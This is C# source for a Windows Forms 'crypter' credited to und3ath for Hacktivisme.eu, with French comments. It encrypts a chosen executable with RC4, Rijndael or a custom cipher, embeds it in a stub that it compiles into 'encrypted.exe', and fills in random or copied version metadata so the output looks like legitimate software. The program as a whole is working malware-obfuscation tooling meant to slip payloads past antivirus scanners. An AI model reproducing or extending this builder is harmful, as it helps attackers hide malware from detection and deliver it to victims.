// Source By und3ath For Hacktivisme.eu 







using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Resources;
using System.IO;
using System.Diagnostics;
using System.Security.Cryptography;

namespace Crypt
{
    public partial class Form1 : Form
    {



        public Form1()
        {
            InitializeComponent();
            this.pan3.Location = this.pan2.Location;
 
        }
        Random random0 = new Random();
        private string fnalsrc = Properties.Resources.Source;
        private static Random random_0 = new Random();    
        private string key = "";



/// <summary>
/// ///////////////////////////////////////////////////////////////////////////
/// </summary>
/// <param name="sender"></param>
/// <param name="e"></param>









        private void Modsource()
        {
            if (radioButton4.Checked == true)
            {
                fnalsrc = fnalsrc.Replace("{und3ath}", this.key);
                fnalsrc = fnalsrc.Replace("[[]]", "RijndaelDecrypt");
                fnalsrc = fnalsrc.Replace("[ENCRYPTION]", Properties.Resources.Rijndael);
                fnalsrc = fnalsrc.Replace("//|", "");
            }
          

            if (radioButton2.Checked == true)
            {

              
                fnalsrc = fnalsrc.Replace("{und3ath}", this.key);
                fnalsrc = fnalsrc.Replace("[[]]", "RC4EncryptDecrypt");
                fnalsrc = fnalsrc.Replace("[ENCRYPTION]", Properties.Resources.Rc4);
                fnalsrc = fnalsrc.Replace("//|", "");
        
            }

            if (radioButton1.Checked == true)
            {
                
                fnalsrc = fnalsrc.Replace("{und3ath}", this.key);
                fnalsrc = fnalsrc.Replace("[[]]", "DexDecrypt");
                fnalsrc = fnalsrc.Replace("[ENCRYPTION]", Properties.Resources.Dex);
                fnalsrc = fnalsrc.Replace("//|", "");
              }

            if (checkBox6.Checked == true)
            {
                fnalsrc = fnalsrc.Replace("title", this.textBox3.Text).Replace("description", this.textBox4.Text).Replace("company", this.textBox5.Text).Replace("product", this.textBox6.Text).Replace("copyright", this.textBox7.Text).Replace("trademark", this.textBox8.Text).Replace("filevers", string.Concat(new string[]
       {
           this.textBox9.Text, 
           ".", 
           this.textBox10.Text, 
           ".", 
           this.textBox11.Text, 
           ".", 
           this.textBox12.Text
       }));

               

            }

        }      
        private void compilateur()
        {

            System.CodeDom.Compiler.CompilerParameters p = new System.CodeDom.Compiler.CompilerParameters();   // Declaration du variable pour les parametre codedom 
            p.GenerateExecutable = true;   // compile un .exe 
            p.CompilerOptions += "/t:winexe";  // compil un "non-console"
            p.OutputAssembly = "encrypted.exe";  //nom de l'assembly de sortis
            p.ReferencedAssemblies.Add("System.dll");  // Ajoute la reference system.dll
            p.ReferencedAssemblies.Add("System.Windows.Forms.dll");  // ajoute la reference system.windows.forms.dll
            p.EmbeddedResources.Add("res.resources");  //ajoute un fichier ressource a l'assembly contenant les byts de notre exe crypter 


            System.CodeDom.Compiler.CompilerResults r = new Microsoft.CSharp.CSharpCodeProvider().CompileAssemblyFromSource(p, this.fnalsrc);  //Compil l'assembly avec la source , et les parametre predefini .
            System.IO.File.Delete("res.resources"); //suprimes les ressources
            foreach (System.CodeDom.Compiler.CompilerError err in r.Errors) MessageBox.Show(err.ToString());  // Msg box d'erreur au moment de la compilation 
            MessageBox.Show("Crypter avec succé");
        }


        public static string EncryptString(string Message, string Passphrase)
        {
            byte[] Results;
            System.Text.UTF8Encoding UTF8 = new System.Text.UTF8Encoding();

            MD5CryptoServiceProvider HashProvider = new MD5CryptoServiceProvider();
            byte[] TDESKey = HashProvider.ComputeHash(UTF8.GetBytes(Passphrase));


            TripleDESCryptoServiceProvider TDESAlgorithm = new TripleDESCryptoServiceProvider();


            TDESAlgorithm.Key = TDESKey;
            TDESAlgorithm.Mode = CipherMode.ECB;
            TDESAlgorithm.Padding = PaddingMode.PKCS7;

 
            byte[] DataToEncrypt = UTF8.GetBytes(Message);


            try
            {
                ICryptoTransform Encryptor = TDESAlgorithm.CreateEncryptor();
                Results = Encryptor.TransformFinalBlock(DataToEncrypt, 0, DataToEncrypt.Length);
            }
            finally
            {

                TDESAlgorithm.Clear();
                HashProvider.Clear();
            }

            return Convert.ToBase64String(Results);
        }




        private void Comp()
        {
            if (radioButton1.Checked == true)
            {
                System.Resources.ResourceWriter w = new System.Resources.ResourceWriter("res.resources");    //Declaration du nouvelle ressource 
                w.AddResource("file", Cryptoclass.DexEncrypt(System.IO.File.ReadAllBytes(textBox1.Text), this.key));  // lit tout les bytes du fichier source, les encrypt, et les ajout dans la ressource
                w.Close();
            }
            if (radioButton2.Checked == true)
            {
                System.Resources.ResourceWriter w = new System.Resources.ResourceWriter("res.resources");    //Declaration du nouvelle ressource 
                w.AddResource("file", Cryptoclass. RC4EncryptDecrypt(System.IO.File.ReadAllBytes(textBox1.Text), this.key));  // lit tout les bytes du fichier source, les encrypt, et les ajout dans la ressource
                w.Close();
            }
            if (radioButton4.Checked == true)
            {
                System.Resources.ResourceWriter w = new System.Resources.ResourceWriter("res.resources");    //Declaration du nouvelle ressource 
                w.AddResource("file", Cryptoclass.RijndaelEncrypt(System.IO.File.ReadAllBytes(textBox1.Text), this.key));  // lit tout les bytes du fichier source, les encrypt, et les ajout dans la ressource
                w.Close();
            }
            



        }
        public static string smethod_4(int length)
        {
            string text = null;
            char[] array = "abcdefghijklmnopqrtstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ".ToCharArray();
            for (int i = 0; i < length; i++)
            {
                text += array[Form1.random_0.Next(array.Length)].ToString();
            }
            return text;
        }
        public static string smethod_5(int length)
        {
            string text = null;
            char[] array = "0123456789".ToCharArray();
            for (int i = 0; i < length; i++)
            {
                text += array[Form1.random_0.Next(array.Length)].ToString();
            }
            return text;
        }
        private string method_33(int int_0)
        {
            string text = "ƀƁƂƄƅƆƈƉƋƍƎƏƐƑƒƓƔƕƖƗƘƙƜƛơƣƥƪƩƱƲƳƴǍǎǢǣǤǥǭȄȜȞȣȮփռպֆӸӂҿҧ";
            string text2 = null;
            for (int i = 0; i < int_0; i++)
            {
                text2 += text[this.random0.Next(0, text.Length)];
            }
            return text2;
        }
        private string Randomkey()
        {
            string text = "";
            if (this.radioButton5.Checked == true)
            {

                 text = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVXYZ1234567890";
            }
            if (this.radioButton6.Checked == true)
            {
                text = this.method_33(20);
            }
            Random random = new Random();

            int num = Convert.ToInt32(25);
            string text2 = null;
            for (int i = 0; i < num; i++)
            {
                text2 += text[random.Next(0, text.Length)];
            }
            return text2;
        }
        

        private void button1_Click(object sender, EventArgs e)
        {
            OpenFileDialog d = new OpenFileDialog();                               //Ouvre une boite de dialogue et met le chemin d'accer du fichier dans textbox1
            if (d.ShowDialog() == DialogResult.OK) textBox1.Text = d.FileName;
        }

        private void button2_Click(object sender, EventArgs e)
        {
           

            string src = Properties.Resources.Source;
            
            if (textBox2.Text == string.Empty)
            {
                MessageBox.Show("Vous Devez Generer une clef");
            }
            else
            {
                Modsource();
                Comp();
                compilateur();

         
            }
           


        }

 
        private void button3_Click(object sender, EventArgs e)
        {
           
            this.textBox2.Text = Randomkey();
            this.key = textBox2.Text;
        }
    

          private void radioButton3_CheckedChanged(object sender, EventArgs e)
          {
          
          }

       

          private void button7_Click(object sender, EventArgs e)
          {
              this.textBox3.Text = Form1.smethod_4(10);
              this.textBox4.Text = Form1.smethod_4(10);
              this.textBox5.Text = Form1.smethod_4(10);
              this.textBox6.Text = Form1.smethod_4(10);
              this.textBox7.Text = Form1.smethod_4(10);
              this.textBox8.Text = Form1.smethod_4(10);
              this.textBox9.Text = Form1.smethod_5(4);
              this.textBox10.Text = Form1.smethod_5(4);
              this.textBox11.Text = Form1.smethod_5(4);
              this.textBox12.Text = Form1.smethod_5(4);
          }

          private void button8_Click(object sender, EventArgs e)
          {
              OpenFileDialog openFileDialog = new OpenFileDialog();
              if (openFileDialog.ShowDialog() == DialogResult.OK)
              {
                  FileVersionInfo versionInfo = FileVersionInfo.GetVersionInfo(openFileDialog.FileName);
                  string fileVersion = versionInfo.FileVersion;
                  string[] array = fileVersion.Split(new char[]
       {
           '.'
       });
                  this.textBox3.Text = Path.GetFileNameWithoutExtension(openFileDialog.FileName);
                  this.textBox4.Text = versionInfo.FileDescription;
                  this.textBox5.Text = versionInfo.CompanyName;
                  this.textBox6.Text = versionInfo.ProductName;
                  this.textBox7.Text = versionInfo.LegalCopyright;
                  this.textBox8.Text = versionInfo.LegalTrademarks;
                  try
                  {
                      this.textBox9.Text = int.Parse(array[0]).ToString();
                      this.textBox10.Text = int.Parse(array[1]).ToString();
                      this.textBox11.Text = int.Parse(array[2]).ToString();
                      this.textBox12.Text = int.Parse(array[3]).ToString();
                  }
                  catch
                  {
                  }
              }
          }
         
          private void button4_Click(object sender, EventArgs e)
          {
            
          }

          private void Form1_Load(object sender, EventArgs e)
          {
              this.pan2.Location = this.pan1.Location;
              this.pan3.Location = this.pan1.Location;
          }

         

         

          

          private void button5_Click(object sender, EventArgs e)
          {
              this.pan1.Visible = false;
              this.pan2.Visible = true;
              this.pan3.Visible = false;
          }

          private void button6_Click(object sender, EventArgs e)
          {
              this.pan1.Visible = false;
              this.pan2.Visible = false;
              this.pan3.Visible = true;
          }

          private void button4_Click_1(object sender, EventArgs e)
          {
              this.pan1.Visible = true;
              this.pan2.Visible = false;
              this.pan3.Visible = false;
          }

          private void button9_Click(object sender, EventArgs e)
          {
              textBox15.Text = EncryptString(textBox13.Text, textBox14.Text);
          }

        
       
    }
}
